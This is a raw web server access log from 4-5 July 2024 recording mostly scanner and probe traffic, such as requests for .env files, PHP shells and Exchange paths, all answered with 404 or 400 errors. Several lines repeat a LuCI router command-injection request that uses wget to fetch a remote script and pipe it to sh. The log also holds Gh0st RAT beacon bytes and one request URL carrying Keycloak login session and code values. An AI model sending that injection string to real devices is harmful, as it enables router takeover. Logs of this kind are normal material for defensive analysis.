45.79.181.94 - - [04/Jul/2024:14:09:33 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xF9\x95Qc\x00\xD6G\xD7\x22c\xD8\xD7\xE7\xD6\x09\x85O^\x01.\xDC\xC0(\xD7n_-\x19)\xE54\xD9\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
31.220.1.83 - - [04/Jul/2024:14:09:38 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
185.191.126.213 - - [04/Jul/2024:14:14:27 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [04/Jul/2024:14:37:09 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
44.236.133.133 - - [04/Jul/2024:14:40:56 +0000] "\x00\x00\x00P\x00\x03\x00\x00user\x00nuclei\x00database\x00nuclei\x00application_name\x00psql\x00client_encoding\x00UTF8\x00\x00p\x00\x00\x006SCRAM-SHA-256\x00\x00\x00\x00 n,,n=,r=\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 154 "-" "-"
44.236.133.133 - - [04/Jul/2024:14:40:56 +0000] "GET / HTTP/1.1" 404 150 "-" "WizDynamicScanner/1.0"
54.191.198.58 - - [04/Jul/2024:14:40:57 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36"
44.236.133.133 - - [04/Jul/2024:14:40:58 +0000] "GET /version HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
198.46.226.68 - - [04/Jul/2024:15:41:20 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [04/Jul/2024:15:42:08 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
170.64.206.247 - - [04/Jul/2024:16:33:57 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x032\xC0\xE4Q\x17.\xE2\xD6\x9F\xAF\xC9U\xF6:\x85\xC4\xE7~\x96\xAF\xFA\x940\xC7\xA8F\x8B$l{\xF5\xB3\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
170.64.206.247 - - [04/Jul/2024:16:33:57 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x88\xB7\x12\x0B\x99\x07CC\xFD\xACwq\xC3f\xE7\x10\xACQ\xC9Z\xAB\xE5)\xB1" 400 154 "-" "-"
170.64.206.247 - - [04/Jul/2024:16:33:57 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.206.247 - - [04/Jul/2024:16:33:57 +0000] "GET /form.html HTTP/1.1" 404 122 "-" "curl/8.1.2"
170.64.206.247 - - [04/Jul/2024:16:33:58 +0000] "GET /upl.php HTTP/1.1" 404 122 "-" "Mozilla/5.0"
170.64.206.247 - - [04/Jul/2024:16:33:58 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8B\xAE6\x01+M\xAB\x0C\xF5t\x85\xFB\x11\xE5jV\xF6|\x89\xF3 6?\x84\xCA\xF0\xA5\x5C-\x02\x9Ea\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
170.64.206.247 - - [04/Jul/2024:16:33:58 +0000] "GET /geoip/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.206.247 - - [04/Jul/2024:16:33:59 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.206.247 - - [04/Jul/2024:16:33:59 +0000] "GET /1.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.206.247 - - [04/Jul/2024:16:33:59 +0000] "GET /bundle.js HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.206.247 - - [04/Jul/2024:16:34:00 +0000] "GET /files/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.206.247 - - [04/Jul/2024:16:34:00 +0000] "GET /systembc/password.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.206.247 - - [04/Jul/2024:16:34:00 +0000] "GET /password.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.206.247 - - [04/Jul/2024:16:34:01 +0000] "GET /info.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
213.204.108.115 - - [04/Jul/2024:17:42:11 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
199.45.155.85 - - [04/Jul/2024:17:54:59 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
199.45.155.85 - - [04/Jul/2024:17:55:08 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.85 - - [04/Jul/2024:17:55:09 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
185.224.128.43 - - [04/Jul/2024:18:01:40 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [04/Jul/2024:18:03:00 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.240.205.34 - - [04/Jul/2024:18:06:59 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 154 "-" "-"
92.249.48.202 - - [04/Jul/2024:18:15:26 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.220.1.83 - - [04/Jul/2024:18:27:01 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
157.230.37.129 - - [04/Jul/2024:18:40:15 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
157.230.37.129 - - [04/Jul/2024:18:41:06 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03\xCD'8\xB6\x80\xBF\xF2~Sa\xF0\x18j\x86\x1D\xA3T\xB3\x0E\xB1\xF2\x97\xC8\xDC \xF8\xBE\xE1$B\xE8y 0\xD9L\xBE\xCD\xC9\x87\x84@\xAF\xA4Rc\x88\xDC\xA0\xCBF\xB9\x9A\xA63i\xB9\xDD\x15\xB0jSc@\x19\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
193.177.182.107 - - [04/Jul/2024:18:47:45 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
66.240.205.34 - - [04/Jul/2024:19:12:11 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 154 "-" "-"
211.233.24.7 - - [04/Jul/2024:19:26:24 +0000] "HEAD / HTTP/1.1" 404 0 "-" "-"
211.233.24.7 - - [04/Jul/2024:19:26:25 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [04/Jul/2024:19:58:21 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.98.200.158 - - [04/Jul/2024:20:17:28 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
31.220.1.83 - - [04/Jul/2024:20:39:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
45.79.128.205 - - [04/Jul/2024:20:47:17 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03j\x17\x07\x9A\x80;\xDC\x02\x1B\x1E\xA1\x85\xC7\xBD\xFF\xF5|\xBB\xFC\xA9I\x83\x95|\x04\xF2%\xA5\xA5\xCA\x8B\xF2\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
46.174.191.32 - - [04/Jul/2024:21:25:39 +0000] "GET / HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
31.220.1.83 - - [04/Jul/2024:21:44:52 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [04/Jul/2024:21:57:17 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.129.23.166 - - [04/Jul/2024:22:36:35 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:22:36:35 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.11.51 - - [04/Jul/2024:22:40:21 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xBE\xD6\x1Bhb2\x13m\x84\x93\x13\xC7\xE4 \x8C\xFEak\xA92\x97z\xF6I\x87r\x9E\xE0_" 400 154 "-" "-"
185.224.128.43 - - [04/Jul/2024:22:50:13 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.220.1.83 - - [04/Jul/2024:23:26:58 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
185.180.140.6 - - [04/Jul/2024:23:36:11 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.140.6 - - [04/Jul/2024:23:36:15 +0000] "GET /console HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
205.210.31.30 - - [04/Jul/2024:23:51:32 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.202 - - [04/Jul/2024:23:52:13 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.40 - - [04/Jul/2024:23:56:27 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03&\xEFY\xCB@\xEA\xBBI1\xD3\xB4\x9B*\xB8h\xD5\xA6\x94\xC13\x92\x93'y\xD7\x9B\xC0" 400 154 "-" "-"
205.210.31.40 - - [04/Jul/2024:23:56:27 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x9A\xBC\x04\xF8\xEB\x011\x85\xAB6p\xA5\xDB\x11\xA4g>\x97G\x06<$\x7FX\xAB\xC5\x9EqX8\xA5\x8D\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
31.220.1.83 - - [05/Jul/2024:00:03:20 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
205.210.31.6 - - [05/Jul/2024:00:16:00 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
83.97.73.245 - - [05/Jul/2024:00:17:09 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
103.106.230.178 - - [05/Jul/2024:00:30:07 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
45.79.181.104 - - [05/Jul/2024:00:37:43 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x1E\x92\xD0\xC0<\x91\x82\x941\xB4\xCF\xF6\xAAVe\xB9E\x06\xC6/\x10\x86\x96|\xA7\xD1\xF0N\xDE\xFE\x97\xAA\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
141.98.83.197 - - [05/Jul/2024:00:39:13 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.199 - - [05/Jul/2024:00:51:48 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
48.217.100.37 - - [05/Jul/2024:00:57:56 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
48.217.100.37 - - [05/Jul/2024:01:01:43 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.100.37 - - [05/Jul/2024:01:01:44 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.100.37 - - [05/Jul/2024:01:01:44 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.100.37 - - [05/Jul/2024:01:01:46 +0000] "GET /wsman HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.100.37 - - [05/Jul/2024:01:02:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
57.129.23.166 - - [05/Jul/2024:01:04:06 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:01:04:06 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
31.220.1.83 - - [05/Jul/2024:01:12:28 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
83.97.73.245 - - [05/Jul/2024:01:49:39 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:02:12:29 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:02:12:30 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.105.128.12 - - [05/Jul/2024:02:21:26 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xF8\xB6|`Y\xF7( \x13\x80P/`W\x8C\xAF{J\xBD\x9F\x89\xDDVz\xB9!\xD5l[\xCF\x9E^\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
157.230.37.129 - - [05/Jul/2024:02:42:32 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
157.230.37.129 - - [05/Jul/2024:02:43:25 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03\x8B\xD2a'\x95n\x83\xBE\xB1\x0B\x12\xF7\xA8Z0V\x91\x87\xEC1\x89\x09\x86x#\x9F\xA8\xC0\xF3\xD3\xF0z G<\x5C\x0ELBhA\x06z\x09Q\x02e\xD3\xF3\xA0r=!}\x91\x04Zc\x8E\xD9+\x80\xE5U\x8D\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
31.220.1.83 - - [05/Jul/2024:02:49:32 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
185.191.126.213 - - [05/Jul/2024:03:08:46 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [05/Jul/2024:03:15:31 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.129.23.166 - - [05/Jul/2024:03:22:42 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:03:22:42 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.27.164.217 - - [05/Jul/2024:03:28:40 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.27.164.217 - - [05/Jul/2024:03:28:40 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.43 - - [05/Jul/2024:03:31:11 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.150.26.246 - - [05/Jul/2024:04:07:37 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
57.129.23.166 - - [05/Jul/2024:04:11:36 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:04:11:37 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:04:28:44 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "http://git.buckfiddy/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
35.203.210.86 - - [05/Jul/2024:04:41:34 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
57.129.23.166 - - [05/Jul/2024:05:16:50 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:05:16:50 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.249.48.202 - - [05/Jul/2024:05:37:44 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.18.0.1 - - [05/Jul/2024:05:47:18 +0000] "GET /auth/admin/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:05:47:18 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "http://team.buckfiddy/auth/admin/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:05:47:25 +0000] "GET /auth/admin/master HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:05:47:27 +0000] "GET /auth/admin/master/console/?state=a99cfabc-21e3-4b26-9964-95c35a1e74af&session_state=9ccc9b73-1f56-42ec-8261-6e799fa24ba6&iss=https%3A%2F%2Fbuckfiddy.westus2.cloudapp.azure.com%2Fauth%2Frealms%2Fmaster&code=d97a7aec-34b3-4971-b146-3d00a3b5da4b.9ccc9b73-1f56-42ec-8261-6e799fa24ba6.cb3250a8-757a-4d34-8aca-0b1ce56bc1ac HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:05:47:37 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:05:50:26 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:05:50:27 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:05:50:27 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:05:50:33 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:05:51:02 +0000] "GET /git HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
185.150.26.246 - - [05/Jul/2024:05:52:58 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
164.90.237.220 - - [05/Jul/2024:05:56:06 +0000] "GET http://uplo.ad/?v=1&ip=20.120.210.192&port=80 HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"
172.104.131.24 - - [05/Jul/2024:05:57:36 +0000] "GET /Temporary_Listen_Addresses/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.104.131.24 - - [05/Jul/2024:05:57:37 +0000] "GET /ews/ews/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.104.131.24 - - [05/Jul/2024:05:57:37 +0000] "GET /ews/exchange/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.104.131.24 - - [05/Jul/2024:05:57:37 +0000] "GET /ews/exchanges/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
